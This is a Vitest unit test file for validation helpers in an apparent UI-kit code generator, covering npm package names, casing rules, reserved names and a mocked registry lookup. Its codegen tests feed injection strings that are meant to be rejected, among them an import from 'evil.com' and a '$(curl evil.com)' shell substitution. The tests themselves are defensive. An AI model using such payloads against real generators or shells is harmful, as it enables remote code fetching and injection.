/**
 * Unit tests for validation utilities
 *
 */

import { describe, expect, it, vi } from 'vitest';
import {
  isCustomUikit,
  normalizeUikit,
  isValidPackageName,
  isCamelCase,
  isPascalCase,
  isReservedScreensetName,
  validateNpmPackage,
  assertValidUikitForCodegen,
} from './validation.js';

describe('isCustomUikit', () => {
  it('should return false for "shadcn"', () => {
    expect(isCustomUikit('shadcn')).toBe(false);
  });

  it('should return false for "none"', () => {
    expect(isCustomUikit('none')).toBe(false);
  });

  it('should return false for legacy "frontx" alias', () => {
    expect(isCustomUikit('frontx')).toBe(false);
  });

  it('should return true for scoped npm packages', () => {
    expect(isCustomUikit('@acronis-platform/shadcn-uikit')).toBe(true);
    expect(isCustomUikit('@my-org/ui')).toBe(true);
  });

  it('should return true for unscoped npm packages', () => {
    expect(isCustomUikit('antd')).toBe(true);
    expect(isCustomUikit('material-ui')).toBe(true);
  });
});

describe('normalizeUikit', () => {
  it('should map legacy "frontx" to "shadcn"', () => {
    expect(normalizeUikit('frontx')).toBe('shadcn');
  });

  it('should keep non-legacy values unchanged', () => {
    expect(normalizeUikit('shadcn')).toBe('shadcn');
    expect(normalizeUikit('none')).toBe('none');
    expect(normalizeUikit('@my-org/ui')).toBe('@my-org/ui');
  });
});

describe('isValidPackageName', () => {
  it('should reject empty strings', () => {
    expect(isValidPackageName('')).toBe(false);
  });

  it('should reject names longer than 214 characters', () => {
    expect(isValidPackageName('a'.repeat(215))).toBe(false);
    expect(isValidPackageName('a'.repeat(214))).toBe(true);
  });

  it('should reject names starting with . or _', () => {
    expect(isValidPackageName('.hidden')).toBe(false);
    expect(isValidPackageName('_private')).toBe(false);
  });

  it('should reject uppercase characters', () => {
    expect(isValidPackageName('MyPackage')).toBe(false);
    expect(isValidPackageName('myPackage')).toBe(false);
  });

  it('should reject special characters', () => {
    expect(isValidPackageName('my~package')).toBe(false);
    expect(isValidPackageName("my'package")).toBe(false);
    expect(isValidPackageName('my!package')).toBe(false);
    expect(isValidPackageName('my(package)')).toBe(false);
    expect(isValidPackageName('my*package')).toBe(false);
  });

  it('should accept valid unscoped names', () => {
    expect(isValidPackageName('my-project')).toBe(true);
    expect(isValidPackageName('frontx')).toBe(true);
    expect(isValidPackageName('some-package-123')).toBe(true);
  });

  it('should accept valid scoped names', () => {
    expect(isValidPackageName('@gears-frontx/cli')).toBe(true);
    expect(isValidPackageName('@my-org/my-package')).toBe(true);
  });

  it('should reject malformed scoped names', () => {
    expect(isValidPackageName('@/missing-scope')).toBe(false);
    expect(isValidPackageName('@scope/')).toBe(false);
    expect(isValidPackageName('@scope')).toBe(false);
  });
});

describe('isCamelCase', () => {
  it('should reject empty strings', () => {
    expect(isCamelCase('')).toBe(false);
  });

  it('should reject strings starting with uppercase', () => {
    expect(isCamelCase('MyComponent')).toBe(false);
    expect(isCamelCase('ABC')).toBe(false);
  });

  it('should reject strings with non-alphanumeric characters', () => {
    expect(isCamelCase('my-name')).toBe(false);
    expect(isCamelCase('my_name')).toBe(false);
    expect(isCamelCase('my name')).toBe(false);
    expect(isCamelCase('my.name')).toBe(false);
  });

  it('should accept valid camelCase strings', () => {
    expect(isCamelCase('contacts')).toBe(true);
    expect(isCamelCase('myScreenset')).toBe(true);
    expect(isCamelCase('dashboard')).toBe(true);
    expect(isCamelCase('contactList2')).toBe(true);
  });

  it('should reject strings starting with a number', () => {
    expect(isCamelCase('2things')).toBe(false);
  });
});

describe('isPascalCase', () => {
  it('should reject empty strings', () => {
    expect(isPascalCase('')).toBe(false);
  });

  it('should reject strings starting with lowercase', () => {
    expect(isPascalCase('myComponent')).toBe(false);
    expect(isPascalCase('abc')).toBe(false);
  });

  it('should reject strings with non-alphanumeric characters', () => {
    expect(isPascalCase('My-Name')).toBe(false);
    expect(isPascalCase('My_Name')).toBe(false);
    expect(isPascalCase('My Name')).toBe(false);
  });

  it('should accept valid PascalCase strings', () => {
    expect(isPascalCase('Contacts')).toBe(true);
    expect(isPascalCase('MyScreenset')).toBe(true);
    expect(isPascalCase('Dashboard')).toBe(true);
    expect(isPascalCase('ContactList2')).toBe(true);
  });
});

describe('isReservedScreensetName', () => {
  it('should flag reserved names', () => {
    expect(isReservedScreensetName('screenset')).toBe(true);
    expect(isReservedScreensetName('screen')).toBe(true);
    expect(isReservedScreensetName('index')).toBe(true);
    expect(isReservedScreensetName('api')).toBe(true);
    expect(isReservedScreensetName('core')).toBe(true);
  });

  it('should be case-insensitive', () => {
    expect(isReservedScreensetName('Screenset')).toBe(true);
    expect(isReservedScreensetName('INDEX')).toBe(true);
    expect(isReservedScreensetName('Api')).toBe(true);
  });

  it('should allow non-reserved names', () => {
    expect(isReservedScreensetName('contacts')).toBe(false);
    expect(isReservedScreensetName('dashboard')).toBe(false);
    expect(isReservedScreensetName('settings')).toBe(false);
  });
});

describe('assertValidUikitForCodegen', () => {
  it('should accept valid unscoped package names', () => {
    expect(() => {
      assertValidUikitForCodegen('antd');
    }).not.toThrow();
    expect(() => {
      assertValidUikitForCodegen('material-ui');
    }).not.toThrow();
    expect(() => {
      assertValidUikitForCodegen('my-ui-lib');
    }).not.toThrow();
  });

  it('should accept valid scoped package names', () => {
    expect(() => {
      assertValidUikitForCodegen('@my-org/ui');
    }).not.toThrow();
    expect(() => {
      assertValidUikitForCodegen('@acronis-platform/shadcn-uikit');
    }).not.toThrow();
  });

  it('should reject TypeScript injection via quotes and semicolons', () => {
    expect(() => {
      assertValidUikitForCodegen("'; import('http://evil.com/x');");
    }).toThrow(/not a valid npm package name/);
  });

  it('should reject shell-style injection payloads', () => {
    expect(() => {
      assertValidUikitForCodegen('$(curl evil.com)');
    }).toThrow(/not a valid npm package name/);
  });

  it('should reject newline injection', () => {
    expect(() => {
      assertValidUikitForCodegen('valid\n//malicious');
    }).toThrow(/not a valid npm package name/);
  });

  it('should reject empty string', () => {
    expect(() => {
      assertValidUikitForCodegen('');
    }).toThrow(/not a valid npm package name/);
  });

  it('should reject names with special characters', () => {
    expect(() => {
      assertValidUikitForCodegen('invalid!@#$');
    }).toThrow(/not a valid npm package name/);
  });

  it('should reject names with spaces', () => {
    expect(() => {
      assertValidUikitForCodegen('my package');
    }).toThrow(/not a valid npm package name/);
  });

  it('should reject uppercase names', () => {
    expect(() => {
      assertValidUikitForCodegen('MyPackage');
    }).toThrow(/not a valid npm package name/);
  });
});

describe('validateNpmPackage', () => {
  it('should reject syntactically invalid names without hitting the network', async () => {
    const result = await validateNpmPackage('!!!INVALID!!!');
    expect(result.exists).toBe(false);
    expect(result.error?.includes('not a valid npm package name')).toBeTruthy();
  });

  it('should reject empty string', async () => {
    const result = await validateNpmPackage('');
    expect(result.exists).toBe(false);
    expect(result.error).toBeTruthy();
  });

  it('should reject uppercase names', async () => {
    const result = await validateNpmPackage('MyPackage');
    expect(result.exists).toBe(false);
    expect(result.error?.includes('not a valid npm package name')).toBeTruthy();
  });

  it('should return exists:true for a known valid package', async () => {
    expect.assertions(2);
    const mockFetch = vi.fn(() =>
      Promise.resolve(new Response(null, { status: 200 }))
    );
    vi.stubGlobal('fetch', mockFetch);
    try {
      const result = await validateNpmPackage('lodash');
      expect(result.exists).toBe(true);
      expect(result.error).toBe(undefined);
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it('should return exists:false for a 404 response', async () => {
    expect.assertions(2);
    const mockFetch = vi.fn(() =>
      Promise.resolve(new Response(null, { status: 404 }))
    );
    vi.stubGlobal('fetch', mockFetch);
    try {
      const result = await validateNpmPackage('lodash');
      expect(result.exists).toBe(false);
      expect(result.error?.includes('not found')).toBeTruthy();
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it('should return exists:true with warning on network failure for valid names', async () => {
    expect.assertions(2);
    const mockFetch = vi.fn(() =>
      Promise.reject(new Error('network down'))
    );
    vi.stubGlobal('fetch', mockFetch);
    try {
      const result = await validateNpmPackage('lodash');
      expect(result.exists).toBe(true);
      expect(result.warning?.includes('Could not verify')).toBeTruthy();
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it('should reject invalid names even when network would fail', async () => {
    expect.assertions(3);
    const mockFetch = vi.fn(() =>
      Promise.reject(new Error('network down'))
    );
    vi.stubGlobal('fetch', mockFetch);
    try {
      const result = await validateNpmPackage('INVALID_NAME');
      expect(result.exists).toBe(false);
      expect(result.error?.includes('not a valid npm package name')).toBeTruthy();
      expect(mockFetch.mock.calls.length).toBe(0);
    } finally {
      vi.unstubAllGlobals();
    }
  });
});
